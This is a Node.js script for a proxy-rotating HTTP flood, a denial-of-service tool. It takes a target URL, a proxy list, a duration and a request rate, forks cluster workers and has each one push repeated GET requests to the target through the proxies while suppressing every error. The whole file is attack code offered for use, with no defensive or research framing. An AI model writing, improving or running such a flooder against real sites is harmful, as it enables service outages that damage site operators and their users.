const request = require("request")
const EventEmitter = require('events');
const fs = require('fs');
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);
const url = require('url');
const cluster = require('cluster');

function randomNumber(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

//var file = process.argv[1];
var path = require("path");
var fileName = __filename;
var file = path.basename(fileName);
var target = process.argv[2];
var parsed = url.parse(target);

const UAs = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
];

var target = process.argv[2];
const proxies = fs.readFileSync(process.argv[3], 'utf-8').replace(/\r/g, '').split('\n');
var time = process.argv[4];
var ratelimit = process.argv[5];
var host = url.parse(target).host;
var theproxy = 0;
var proxy = proxies[theproxy];
console.log("\x1b");
console.log("\x1b");
console.log("\x1b");
console.log("\x1b[36musage\x1b[37m: node " + file + " <Target> <Proxies> <Duration> <Request per IP>");
console.log("\x1b[36mAttempting\x1b[37m to get : %s || " + "\x1b[35m" + parsed.host + "\x1b[37m", process.argv[2]);
console.log("Attack has been sent for %s seconds", process.argv[4]);
console.log("[" + proxies.length + "] Proxies loaded!")

if (cluster.isMaster) {
    for (let i = 0; i < process.argv[6]; i++) {
        cluster.fork();
    }
} else {
    var int = setInterval(() => {
        theproxy++;
        if (theproxy == proxies.length - 1) {
            theproxy = 0;
        }
        proxy = proxies[theproxy];
        if (proxy && proxy.length > 5) {
            proxy = proxy.split(':');
        } else {
            return false;
        }
        var s = require('net').Socket();
        s.connect(proxy[1], proxy[0]);
        console.log(proxy)
        s.setTimeout(10000);
        for (var i = 0; i < ratelimit; i++) {
            s.write('GET ' + target + '/ HTTP/1.3\r\nHost: ' + host + '\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nConnection: Keep-Alive\r\n\r\n');
        }
        s.on('data', function() { setTimeout(function() { s.destroy(); return delete s; }, 5000); })
    });
    setTimeout(() => clearInterval(int), time * 1000);
}
process.on('uncaughtException', function(err) {});
process.on('unhandledRejection', function(err) {});